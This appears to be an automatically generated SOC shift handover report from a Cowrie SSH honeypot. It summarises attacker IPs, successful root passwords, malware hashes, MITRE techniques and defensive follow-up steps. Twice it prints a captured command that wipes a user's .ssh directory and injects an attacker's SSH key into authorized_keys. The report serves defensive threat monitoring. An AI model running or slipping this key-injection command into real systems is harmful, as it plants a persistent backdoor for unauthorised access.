# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-22 |
| **Generated At** | 2026-03-22T16:28:28Z |
| **Shift Time** | 16:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **65** |
| Confirmed Threats | **59** |
| False Positives Filtered | **6** (9.2%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **14** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **20** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `dockeradmin` | 1 |
| `debian` | 1 |
| `sdtd` | 1 |
| `nasuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 2 |
| `fibranne` | 2 |
| `123@abc` | 2 |
| `freenas` | 2 |
| `dockeradmin1234` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `fibranne` | 2 |
| `root` | `123@abc` | 2 |
| `root` | `freenas` | 2 |
| `dockeradmin` | `dockeradmin1234` | 1 |
| `debian` | `uploader` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1988` | `182.79.218.164` | 2026-03-22T14:43:28 |
| `root` | `Test1234` | `159.65.149.231` | 2026-03-22T14:47:37 |
| `root` | `Zy123456` | `172.174.46.118` | 2026-03-22T14:57:21 |
| `root` | `3245gs5662d34` | `172.174.46.118` | 2026-03-22T14:57:38 |
| `root` | `fibranne` | `92.47.46.174` | 2026-03-22T15:11:33 |
| `root` | `fibranne` | `223.235.64.126` | 2026-03-22T15:11:40 |
| `root` | `123@abc` | `14.238.137.2` | 2026-03-22T15:15:51 |
| `root` | `123@abc` | `180.166.162.78` | 2026-03-22T15:16:04 |
| `root` | `freenas` | `182.95.48.122` | 2026-03-22T15:20:50 |
| `root` | `freenas` | `196.216.81.126` | 2026-03-22T15:21:04 |
| `root` | `3333333` | `120.211.5.35` | 2026-03-22T16:12:12 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.174.46.118`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **25** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS4812` | China Telecom (Group) | 2 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS45899` | VNPT Corp | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS10396` | DATACOM CARIBE, INC. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-68387b3fa01d

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-03-22 14:43 |
| **Last Seen** | 2026-03-22 14:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 14:43:26` | `cowrie.session.connect` |
| `2026-03-22 14:43:26` | `cowrie.client.version` |
| `2026-03-22 14:43:26` | `cowrie.client.kex` |
| `2026-03-22 14:43:28` | `cowrie.login.success` |
| `2026-03-22 14:43:28` | `cowrie.direct-tcpip.request` |
| `2026-03-22 14:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ea728a8e4b

| Field | Detail |
|---|---|
| **Source IP** | `159.65.149[.]231` |
| **First Seen** | 2026-03-22 14:47 |
| **Last Seen** | 2026-03-22 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 14:47:37` | `cowrie.session.connect` |
| `2026-03-22 14:47:37` | `cowrie.client.version` |
| `2026-03-22 14:47:37` | `cowrie.client.kex` |
| `2026-03-22 14:47:37` | `cowrie.login.success` |
| `2026-03-22 14:47:37` | `cowrie.session.params` |
| `2026-03-22 14:47:37` | `cowrie.command.input` |
| `2026-03-22 14:47:37` | `cowrie.log.closed` |
| `2026-03-22 14:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.149[.]231` to AbuseIPDB if not already reported
- [ ] Block `159.65.149[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-930ece084fa9

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-03-22 14:57 |
| **Last Seen** | 2026-03-22 14:57 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 14:57:19` | `cowrie.session.connect` |
| `2026-03-22 14:57:19` | `cowrie.client.version` |
| `2026-03-22 14:57:20` | `cowrie.client.kex` |
| `2026-03-22 14:57:21` | `cowrie.login.success` |
| `2026-03-22 14:57:24` | `cowrie.session.params` |
| `2026-03-22 14:57:24` | `cowrie.command.input` |
| `2026-03-22 14:57:24` | `cowrie.command.failed` |
| `2026-03-22 14:57:24` | `cowrie.log.closed` |
| `2026-03-22 14:57:25` | `cowrie.session.params` |
| `2026-03-22 14:57:25` | `cowrie.command.input` |
| `2026-03-22 14:57:26` | `cowrie.session.file_download` |
| `2026-03-22 14:57:26` | `cowrie.log.closed` |
| `2026-03-22 14:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-051f8a8aa02a

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-03-22 14:57 |
| **Last Seen** | 2026-03-22 14:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 14:57:32` | `cowrie.session.connect` |
| `2026-03-22 14:57:36` | `cowrie.client.version` |
| `2026-03-22 14:57:38` | `cowrie.client.kex` |
| `2026-03-22 14:57:38` | `cowrie.login.success` |
| `2026-03-22 14:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53daa3fa1706

| Field | Detail |
|---|---|
| **Source IP** | `92.47.46[.]174` |
| **First Seen** | 2026-03-22 15:11 |
| **Last Seen** | 2026-03-22 15:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 15:11:31` | `cowrie.session.connect` |
| `2026-03-22 15:11:31` | `cowrie.client.version` |
| `2026-03-22 15:11:31` | `cowrie.client.kex` |
| `2026-03-22 15:11:33` | `cowrie.login.success` |
| `2026-03-22 15:11:33` | `cowrie.direct-tcpip.request` |
| `2026-03-22 15:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.47.46[.]174` to AbuseIPDB if not already reported
- [ ] Block `92.47.46[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccd6c55e5651

| Field | Detail |
|---|---|
| **Source IP** | `223.235.64[.]126` |
| **First Seen** | 2026-03-22 15:11 |
| **Last Seen** | 2026-03-22 15:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 15:11:38` | `cowrie.session.connect` |
| `2026-03-22 15:11:39` | `cowrie.client.version` |
| `2026-03-22 15:11:39` | `cowrie.client.kex` |
| `2026-03-22 15:11:40` | `cowrie.login.success` |
| `2026-03-22 15:11:40` | `cowrie.direct-tcpip.request` |
| `2026-03-22 15:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.235.64[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.235.64[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b0ac6f11a7

| Field | Detail |
|---|---|
| **Source IP** | `14.238.137[.]2` |
| **First Seen** | 2026-03-22 15:15 |
| **Last Seen** | 2026-03-22 15:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 15:15:48` | `cowrie.session.connect` |
| `2026-03-22 15:15:49` | `cowrie.client.version` |
| `2026-03-22 15:15:49` | `cowrie.client.kex` |
| `2026-03-22 15:15:51` | `cowrie.login.success` |
| `2026-03-22 15:15:51` | `cowrie.direct-tcpip.request` |
| `2026-03-22 15:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.238.137[.]2` to AbuseIPDB if not already reported
- [ ] Block `14.238.137[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab3b8287f534

| Field | Detail |
|---|---|
| **Source IP** | `180.166.162[.]78` |
| **First Seen** | 2026-03-22 15:16 |
| **Last Seen** | 2026-03-22 15:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 15:16:01` | `cowrie.session.connect` |
| `2026-03-22 15:16:02` | `cowrie.client.version` |
| `2026-03-22 15:16:02` | `cowrie.client.kex` |
| `2026-03-22 15:16:04` | `cowrie.login.success` |
| `2026-03-22 15:16:04` | `cowrie.direct-tcpip.request` |
| `2026-03-22 15:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.166.162[.]78` to AbuseIPDB if not already reported
- [ ] Block `180.166.162[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6982be82b4b8

| Field | Detail |
|---|---|
| **Source IP** | `182.95.48[.]122` |
| **First Seen** | 2026-03-22 15:20 |
| **Last Seen** | 2026-03-22 15:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 15:20:48` | `cowrie.session.connect` |
| `2026-03-22 15:20:49` | `cowrie.client.version` |
| `2026-03-22 15:20:49` | `cowrie.client.kex` |
| `2026-03-22 15:20:50` | `cowrie.login.success` |
| `2026-03-22 15:20:51` | `cowrie.direct-tcpip.request` |
| `2026-03-22 15:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.48[.]122` to AbuseIPDB if not already reported
- [ ] Block `182.95.48[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc8bde321d0

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-03-22 15:21 |
| **Last Seen** | 2026-03-22 15:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 15:21:01` | `cowrie.session.connect` |
| `2026-03-22 15:21:02` | `cowrie.client.version` |
| `2026-03-22 15:21:02` | `cowrie.client.kex` |
| `2026-03-22 15:21:04` | `cowrie.login.success` |
| `2026-03-22 15:21:05` | `cowrie.direct-tcpip.request` |
| `2026-03-22 15:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169e0950816e

| Field | Detail |
|---|---|
| **Source IP** | `120.211.5[.]35` |
| **First Seen** | 2026-03-22 16:12 |
| **Last Seen** | 2026-03-22 16:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 16:12:08` | `cowrie.session.connect` |
| `2026-03-22 16:12:09` | `cowrie.client.version` |
| `2026-03-22 16:12:09` | `cowrie.client.kex` |
| `2026-03-22 16:12:12` | `cowrie.login.success` |
| `2026-03-22 16:12:13` | `cowrie.direct-tcpip.request` |
| `2026-03-22 16:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.211.5[.]35` to AbuseIPDB if not already reported
- [ ] Block `120.211.5[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.167.96[.]50` | **16** | 2026-03-22 14:57 | 2026-03-22 15:05 | 26m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.174.46[.]118` | **6** | 2026-03-22 14:31 | 2026-03-22 15:04 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]122` | **2** | 2026-03-22 15:21 | 2026-03-22 15:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.149[.]231` | **2** | 2026-03-22 14:47 | 2026-03-22 14:47 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.34[.]47` | **2** | 2026-03-22 15:37 | 2026-03-22 15:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.171.8[.]156` | **2** | 2026-03-22 15:00 | 2026-03-22 15:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.134.216[.]108` | **2** | 2026-03-22 16:26 | 2026-03-22 16:27 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `8.222.128[.]242` | **2** | 2026-03-22 15:20 | 2026-03-22 15:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]23` | 1 | 2026-03-22 14:51 | 2026-03-22 14:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]70` | 1 | 2026-03-22 16:12 | 2026-03-22 16:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `108.46.187[.]133` | 1 | 2026-03-22 16:03 | 2026-03-22 16:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `116.72.105[.]234` | 1 | 2026-03-22 15:07 | 2026-03-22 15:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.171.145[.]95` | 1 | 2026-03-22 15:39 | 2026-03-22 15:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.7[.]171` | 1 | 2026-03-22 15:53 | 2026-03-22 15:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-03-22 15:34 | 2026-03-22 15:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-22 14:59 | 2026-03-22 14:59 | 21s | 0 | `T1592` | 🟢 LOW |
| `218.21.182[.]228` | 1 | 2026-03-22 15:15 | 2026-03-22 15:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]62` | 1 | 2026-03-22 15:58 | 2026-03-22 15:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]154` | 1 | 2026-03-22 14:32 | 2026-03-22 14:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.141[.]202` | 1 | 2026-03-22 15:48 | 2026-03-22 15:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.251.233[.]179` | 1 | 2026-03-22 16:07 | 2026-03-22 16:07 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-03-22 15:02 | 2026-03-22 15:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 7/100 | 🟢 LOW | **18/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.154[.]154` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 8 |
| `182.79.218[.]164` | IN | BHARTI-AIRTEL | **100** ⚠️ | 50 |
| `223.235.64[.]126` | IN | ABTS DELHI, | **100** ⚠️ | 33 |
| `183.171.7[.]171` | MY | Celcom Axiata Berhad | **100** ⚠️ | 4 |
| `108.46.187[.]133` | US | Verizon Business | **100** ⚠️ | 0 |
| `8.222.128[.]242` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 50 |
| `182.95.48[.]122` | IN | Bharti Airtel Limited | **100** ⚠️ | 25 |
| `196.216.81[.]126` | RW | Liquid Telecommunications Operations Limited | **100** ⚠️ | 50 |
| `116.72.105[.]234` | IN | HATHWAY CABLE AND DATACOM LIMITED | **100** ⚠️ | 50 |
| `65.20.141[.]202` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 49 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 65 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (9.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 22 recon entry/entries in table (8 group(s) consolidating 34 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-22T16:28:28Z_
